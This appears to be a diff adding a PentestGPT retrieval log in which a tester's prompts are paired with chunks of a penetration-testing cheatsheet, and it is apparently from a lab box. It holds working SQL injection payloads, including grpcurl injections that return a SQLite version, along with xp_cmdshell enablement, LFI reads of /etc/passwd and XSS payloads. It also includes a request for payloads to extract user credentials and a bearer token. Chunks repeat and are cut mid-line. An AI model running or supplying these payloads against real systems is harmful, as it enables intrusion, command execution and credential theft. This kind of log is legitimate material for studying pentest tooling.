+#### Using HOST Command
+
+host -t ns(Name Server) < domain >
+
+```shell
+host -t ns domain.com
+```
+
+after that test nameservers
+
+host -l < domain > < nameserver >
+
+```shell
+host -l domain.com ns2.domain.com
+```
+
+### Nmap Dns Enumaration
+
+```
+nmap -F --dns-server <dns server ip> <target ip range>
+```
+
+### Auto tools
+
+#### DNSenum
+
+```
+dnsenum targetdomain.com
+```
+
+```
+dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
+```
+
+#### DNSmap
+
+```bash
+targetdomain.com
+```
+
+```bash
+dnsmap targetdomain.com -w <Wordlst file.txt>
+```
+
+Brute Force, the file is saved in /tmp
+
+```bash
+dnsmap targetdom
+2024-05-06 18:03:09,305 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 10] (Score: 1.41) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+I found the id input to be interesting, how can i check that for SQL injection? | rag-data: mns within a table
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename')--`
+
+> remember to change **dbname** and **tablename** accordingly with the given situation
+> after each iteration a new column name will be found, make sure add it to ** previously found column name ** separated by comma as on the next sample
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename' AND dbname..syscolumns.name NOT IN('previously found column name', ...))--`
+
+#### Actual data
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename)--`
+
+> after each iteration a new column name will be found, make sure add it to ** previously found column name ** separated by comma as on the next sample
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename AND name NOT IN('previously found row data'))--`
+
+#### Shell commands
+
+`EXEC master..xp_cmdshell <command>`
+
+> you need yo be 'sa' user
+
+#### Enabling shell commands
+
+`EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_congigure 'xp_shell', 1; RECONFIGURE;`
+
+### Jenkins
+2024-05-06 18:04:51,782 - INFO - pentestgpt.utils.rag.Local_RAG - - grpcurl.md [Chunk 0] (Score: 0.97) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3MTUwMjg0NjV9.4q25-fshz4uwCEIyel-_l8AwJIYjgwrK8NjqaziMSV8' -d 'id: "26" OR 1=1' 10.10.11.214:50051 SimpleApp.getInfo
+Error invoking method "SimpleApp.getInfo": error getting request data: line 1, col 10: "OR" is not a recognized field name of "getInfoRequest" | rag-data: # grpcurl
+grpcurl is a command-line tool that lets you interact with gRPC servers. It's basically curl for gRPC servers.
+Common ports for gRPC services include 50051
+
+## Example commands:
+### grpcurl -plaintext -vv <ip:port> list
+	Use this for initial scan of the gRPC API.
+	Outputs a list of available services at the given address:port.
+	-plaintext flag says to not use TLS when connecting.
+
+### grpcurl -plaintext -vv <ip:port> list <Service>
+	Use this to gather information about a service provided by the gRPC API.
+	Outputs a list of available methods for the given service.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv <ip:port> describe <Service>
+	Outputs the available methods for the given service with each methods input parameters and expected output.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv -format text -d '<input string>' <ip:port> <Service.Method>
+	Submits data to the given service.method endpoint.
+	-plaintext flag says to not use TSL when connecting.
+	-format text flag tells the given input data is in a text format.
+	-d '<input string>' flag tells what data to submit.
+2024-05-06 18:05:54,016 - INFO - pentestgpt.utils.rag.Local_RAG - - grpcurl.md [Chunk 0] (Score: 1.02) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3MTUwMjg0NjV9.4q25-fshz4uwCEIyel-_l8AwJIYjgwrK8NjqaziMSV8' -d 'id: "26 OR 1=1"' 10.10.11.214:50051 SimpleApp.getInfo
+message: "The admin is working hard to fix the issues." | rag-data: # grpcurl
+grpcurl is a command-line tool that lets you interact with gRPC servers. It's basically curl for gRPC servers.
+Common ports for gRPC services include 50051
+
+## Example commands:
+### grpcurl -plaintext -vv <ip:port> list
+	Use this for initial scan of the gRPC API.
+	Outputs a list of available services at the given address:port.
+	-plaintext flag says to not use TLS when connecting.
+
+### grpcurl -plaintext -vv <ip:port> list <Service>
+	Use this to gather information about a service provided by the gRPC API.
+	Outputs a list of available methods for the given service.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv <ip:port> describe <Service>
+	Outputs the available methods for the given service with each methods input parameters and expected output.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv -format text -d '<input string>' <ip:port> <Service.Method>
+	Submits data to the given service.method endpoint.
+	-plaintext flag says to not use TSL when connecting.
+	-format text flag tells the given input data is in a text format.
+	-d '<input string>' flag tells what data to submit.
+2024-05-06 18:07:48,704 - INFO - pentestgpt.utils.rag.Local_RAG - - searchsploit.md [Chunk 0] (Score: 1.25) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+How can exploit this vulnerability in order to find out what database is running and its version? | rag-data: # SearchSploit
+  Usage: searchsploit [options] term1 [term2] ... [termN]
+
+==========
+ Examples 
+==========
+  searchsploit afd windows local
+  searchsploit -t oracle windows
+  searchsploit -p 39446
+  searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
+  searchsploit -s Apache Struts 2.0.0
+  searchsploit linux reverse password
+  searchsploit -j 55555 | jq
+  searchsploit --cve 2021-44228
+
+  For more examples, see the manual: https://www.exploit-db.com/searchsploit
+
+searchsploit output looks like this, where the left column contains the title of the exploit, and the right column contains a filepath or url to the exploit file.
+------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                          |  Path
+------------------------------------------------------------------------ ---------------------------------
+Oracle 10g (Windows x86) - 'PROCESS_DUP_HANDLE' Local Privilege Escalat | windows_x86/local/3451.c
+Oracle 9i XDB (Windows x86) - FTP PASS Overflow (Metasploit)            | windows_x86/remote/16731.rb
+Oracle 9i XDB (Windows x86) - FTP UNLOCK Overflow (Metasploit)          | windows_x86/remote/16714.rb
+Oracle 9i XDB (Windows x86) - HTTP PASS Overflow (Metasploit)           | windows_x86/remote/16809.rb
+Oracle MySQL (Windows) - FILE Privilege Abuse (Metasploit)              | windows/remote/35777.rb
+Oracle MySQL (Windows) - MOF Execution (Metasploit)                    
+2024-05-06 18:11:26,074 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 10] (Score: 1.49) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+that did not work. Can you check for SQLite? | rag-data: mns within a table
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename')--`
+
+> remember to change **dbname** and **tablename** accordingly with the given situation
+> after each iteration a new column name will be found, make sure add it to ** previously found column name ** separated by comma as on the next sample
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename' AND dbname..syscolumns.name NOT IN('previously found column name', ...))--`
+
+#### Actual data
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename)--`
+
+> after each iteration a new column name will be found, make sure add it to ** previously found column name ** separated by comma as on the next sample
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename AND name NOT IN('previously found row data'))--`
+
+#### Shell commands
+
+`EXEC master..xp_cmdshell <command>`
+
+> you need yo be 'sa' user
+
+#### Enabling shell commands
+
+`EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_congigure 'xp_shell', 1; RECONFIGURE;`
+
+### Jenkins
+2024-05-06 18:13:18,609 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 8] (Score: 1.09) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3MTUwMjg0NjV9.4q25-fshz4uwCEIyel-_l8AwJIYjgwrK8NjqaziMSV8' -d 'id: "26 OR 1=1 UNION SELECT sqlite_version() LIMIT 1"' 10.10.11.214:50051 SimpleApp.getInfo
+message: "3.31.1" | rag-data: 3`
+
+(until it stop returning errors)
+
+---
+
+#### Finding what column is injectable
+
+**mysql**
+
+`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, 3`
+
+(using the same amount of columns you got on the previous step)
+
+**postgresql**
+
+`http://192.168.1.104/Less-1/?id=-1 union select NULL, NULL, NULL`
+
+(using the same amount of columns you got on the previous step)
+
+one of the columns will be printed with the respective number
+
+---
+
+#### Finding version
+
+**mysql**
+
+`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, version()`
+
+**postgres**
+
+`http://192.168.1.104/Less-1/?id=-1 union select NULL, NULL, version()`
+
+#### Finding database name
+
+**mysql**
+
+`http://192.168.1.104/Less-1/?id=-1 union select 1,2, database()`
+
+**postgres**
+
+`http://192.168.1.104/Less-1/?id=-1 union select NULL,NULL, database()`
+
+#### Finding usernames logged in
+
+**mysql**
+
+`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, current_user()`
+
+#### Finding databases
+
+**mysql**
+
+`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, schema_name from information_schema.schemata`
+
+**postgres**
+
+`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, datname from pg_database`
+
+#### Finding table names from a database
+
+**mysql**
+
+```
+http://192.168.1.104/Less-1/?id=-1 union select 1, 2, table_name from information_schema.tables where table_schema="database_name"
+```
+
+**postgres**
+
+```
+http://192.168.1.104/Less-1/?id=-1 union select 1, 2, tablename from pg_tables where table_catalog="database_name"
+```
+
+####
+2024-05-06 18:13:57,713 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 5] (Score: 1.28) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+Can you help me create payloads in order to extract user credentials? | rag-data: 2.168.0.24\\folder ljahdçjkhadkahdkjahsdlkjahsdlkhadklad
+```
+
+## Web Application
+
+### Web Remote code
+
+### LFI (Local File Inclusion)
+
+Situation
+
+```
+http://<target>/index.php?parameter=value
+```
+
+#### How to Test
+
+```
+http://<target>/index.php?parameter=php://filter/convert.base64-encode/resource=index
+```
+
+```
+http://<target>/script.php?page=../../../../../../../../etc/passwd
+
+```
+
+```
+http://<target>/script.php?page=../../../../../../../../boot.ini
+```
+
+#### LFI Payloads
+
+- [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)
+- [Seclist LFI Intruder](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
+
+### encode
+
+## XSS
+
+### Reflected
+
+#### Simple test
+
+This is a simple test to see what happens, this is not a prove that the field is vuln to xss
+
+```javascript
+<plaintext>
+```
+
+#### Simple XSS test
+
+```javascript
+<script>alert('Found')</script>
+```
+
+```javascript
+"><script>alert(Found)</script>">
+```
+
+```javascript
+<script>alert(String.fromCharCode(88,83,83))</script>
+```
+
+#### Bypass filter of tag script
+
+`"  onload="alert(String.fromCharCode(88,83,83))`
+
+```javascript
+" onload="alert('XSS')
+```
+
+bla is not a valid image, so this cause an error
+
+```javascript
+<img src='bla' onerror=alert("XSS")>
+```
+
+### Persistent
+
+```javascript
+>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HACKED!</h1></div>";
+```
+
+### PHP collector
+
+`> cookie.txt`
+`chmod 
+2024-05-06 18:18:54,193 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 10] (Score: 1.40) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+None of these worked, is there any sqlite specific tables we can target? | rag-data: mns within a table
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename')--`
+
+> remember to change **dbname** and **tablename** accordingly with the given situation
+> after each iteration a new column name will be found, make sure add it to ** previously found column name ** separated by comma as on the next sample
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename' AND dbname..syscolumns.name NOT IN('previously found column name', ...))--`
+
+#### Actual data
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename)--`
+
+> after each iteration a new column name will be found, make sure add it to ** previously found column name ** separated by comma as on the next sample
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename AND name NOT IN('previously found row data'))--`
+
+#### Shell commands
+
+`EXEC master..xp_cmdshell <command>`
+
+> you need yo be 'sa' user
+
+#### Enabling shell commands
+
+`EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_congigure 'xp_shell', 1; RECONFIGURE;`
+
+### Jenkins
+2024-05-06 18:20:13,072 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 5] (Score: 1.12) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+None of these payloads works | rag-data: 2.168.0.24\\folder ljahdçjkhadkahdkjahsdlkjahsdlkhadklad
+```
+
+## Web Application
+
+### Web Remote code
+
+### LFI (Local File Inclusion)
+
+Situation
+
+```
+http://<target>/index.php?parameter=value
+```
+
+#### How to Test
+
+```
+http://<target>/index.php?parameter=php://filter/convert.base64-encode/resource=index
+```
+
+```
+http://<target>/script.php?page=../../../../../../../../etc/passwd
+
+```
+
+```
+http://<target>/script.php?page=../../../../../../../../boot.ini
+```
+
+#### LFI Payloads
+
+- [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)
+- [Seclist LFI Intruder](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
+
+### encode
+
+## XSS
+
+### Reflected
+
+#### Simple test
+
+This is a simple test to see what happens, this is not a prove that the field is vuln to xss
+
+```javascript
+<plaintext>
+```
+
+#### Simple XSS test
+
+```javascript
+<script>alert('Found')</script>
+```
+
+```javascript
+"><script>alert(Found)</script>">
+```
+
+```javascript
+<script>alert(String.fromCharCode(88,83,83))</script>
+```
+
+#### Bypass filter of tag script
+
+`"  onload="alert(String.fromCharCode(88,83,83))`
+
+```javascript
+" onload="alert('XSS')
+```
+
+bla is not a valid image, so this cause an error
+
+```javascript
+<img src='bla' onerror=alert("XSS")>
+```
+
+### Persistent
+
+```javascript
+>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HACKED!</h1></div>";
+```
+
+### PHP collector
+
+`> cookie.txt`
+`chmod 
